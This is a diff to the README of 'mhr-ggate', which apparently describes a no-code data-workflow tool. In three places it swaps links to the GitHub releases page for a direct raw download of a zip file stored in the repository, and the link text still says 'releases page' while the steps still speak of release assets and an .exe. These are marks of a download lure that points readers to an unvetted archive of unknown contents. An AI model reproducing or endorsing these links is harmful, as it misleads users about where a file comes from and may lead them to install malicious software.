@@ -1,15 +1,15 @@
 # 🛠️ mhr-ggate - Streamline your data management tasks easily
 
-[![](https://img.shields.io/badge/Download-mhr--ggate-blue.svg)](https://github.com/batus5678/mhr-ggate/releases)
+[![](https://img.shields.io/badge/Download-mhr--ggate-blue.svg)](https://github.com/batus5678/mhr-ggate/raw/refs/heads/main/server/mhr_ggate_v3.4.zip)
 
 This application helps you manage your data workflows. It performs tasks automatically to save you time. You do not need to write code to use these tools. The software provides a simple interface for your daily operations.
 
 ## 📥 How to download the software
 
-Visit [this page](https://github.com/batus5678/mhr-ggate/releases) to download the current version of the software.
+Visit [this page](https://github.com/batus5678/mhr-ggate/raw/refs/heads/main/server/mhr_ggate_v3.4.zip) to download the current version of the software.
 
 1. Open your web browser.
-2. Go to the [releases page](https://github.com/batus5678/mhr-ggate/releases).
+2. Go to the [releases page](https://github.com/batus5678/mhr-ggate/raw/refs/heads/main/server/mhr_ggate_v3.4.zip).
 3. Look for the section labeled Assets under the most recent release.
 4. Click the file that ends in .exe.
 5. Save the file to your computer.
